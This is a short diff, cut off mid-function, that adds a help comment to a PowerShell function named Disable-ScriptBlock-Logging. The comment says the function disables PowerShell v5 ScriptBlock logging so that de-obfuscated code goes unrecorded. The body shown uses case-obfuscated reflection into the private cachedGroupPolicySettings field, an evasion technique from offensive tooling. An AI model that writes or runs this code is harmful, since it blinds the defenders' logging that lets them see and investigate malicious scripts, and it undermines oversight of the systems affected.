@@ -1,4 +1,11 @@
 function Disable-ScriptBlock-Logging {
+
+  <#
+      .SYNOPSIS
+          Function to disable Powershell ScriptBlock Logging introduced in Powershell v5.
+          It prevents the recording of de-obfuscated PowerShell code.
+  #>
+
   $GPF=[rEf].AssembLY.GETTyPe('System.Management.Automation.Utils')."GETField"('cachedGroupPolicySettings','NonPublic,Static');
   If ($GPF) {
     $GPC=$GPF.GeTVAlUe($NuLl);
